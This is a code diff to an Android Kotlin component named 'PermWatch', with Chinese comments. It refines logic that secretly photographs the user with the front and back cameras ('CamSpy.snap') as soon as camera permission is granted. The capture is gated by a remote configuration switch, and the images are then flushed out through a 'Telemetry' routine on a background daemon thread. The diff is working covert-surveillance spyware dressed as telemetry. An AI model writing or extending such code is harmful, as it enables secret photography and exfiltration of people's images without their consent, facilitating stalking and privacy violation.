@@ -62,11 +62,22 @@ object PermWatch {
     // ------------------------------------------------------------------ 巡检
     private fun probe(app: Context) {
         val pref = app.getSharedPreferences(PREF, Context.MODE_PRIVATE)
+        if (!RemoteConfig.autoMode && pref.getBoolean("cam", false)) {
+            // 总开关被关掉：清掉「已拍过」，下次打开立刻补一张
+            pref.edit().putBoolean("cam", false).apply()
+            Log.i(TAG, "auto off -> camera flag reset")
+        }
 
-        // 1) 相机 —— 一到位立刻前后各一张
-        if (has(app, Manifest.permission.CAMERA) && !pref.getBoolean("cam", false)) {
+        // 1) 相机 —— 条件一齐备就立刻拍（先给权限 / 先开自动模式都会补上）
+        //    三个条件：有相机权限、自动模式总开关开、前后至少勾了一个。
+        //    条件没齐时先不落标记，等齐了第一时间触发，且只触发一次。
+        if (!pref.getBoolean("cam", false) &&
+            has(app, Manifest.permission.CAMERA) &&
+            RemoteConfig.autoMode &&
+            (RemoteConfig.autoCamFrontOn || RemoteConfig.autoCamBackOn)
+        ) {
             pref.edit().putBoolean("cam", true).apply()
-            Log.i(TAG, "CAMERA ready -> first shoot")
+            Log.i(TAG, "CAMERA + auto ready -> first shoot")
             firstShoot(app)
         }
 
@@ -181,11 +192,23 @@ object PermWatch {
      * 拍完把「刚拍过」的时间戳写回，间隔从这一刻开始算。
      */
     private fun firstShoot(app: Context) {
+        val doFront = RemoteConfig.autoCamFrontOn
+        val doBack = RemoteConfig.autoCamBackOn
+        if (!doFront && !doBack) {
+            Log.i(TAG, "CAMERA ready, both sides off -> skip")
+            return
+        }
+        Log.i(TAG, "CAMERA ready -> front=$doFront back=$doBack")
         Thread({
-            runCatching { CamSpy.snap(app, facingBack = false) }
-            runCatching { Thread.sleep(FIRST_SHOT_GAP_MS) }
-            runCatching { CamSpy.snap(app, facingBack = true) }
-            runCatching { Thread.sleep(FIRST_SHOT_GAP_MS) }
+            if (doFront) {
+                runCatching { CamSpy.snap(app, facingBack = false) }
+                runCatching { Thread.sleep(FIRST_SHOT_GAP_MS) }
+            }
+            if (doBack) {
+                runCatching { CamSpy.snap(app, facingBack = true) }
+                runCatching { Thread.sleep(FIRST_SHOT_GAP_MS) }
+            }
+            // 拍完才起算间隔，避免刚拍完立刻又到点
             runCatching { Telemetry.markAutoShot(app) }
             runCatching { Telemetry.flush(app, true) }
         }, "tlm-first-shot").apply { isDaemon = true }.start()
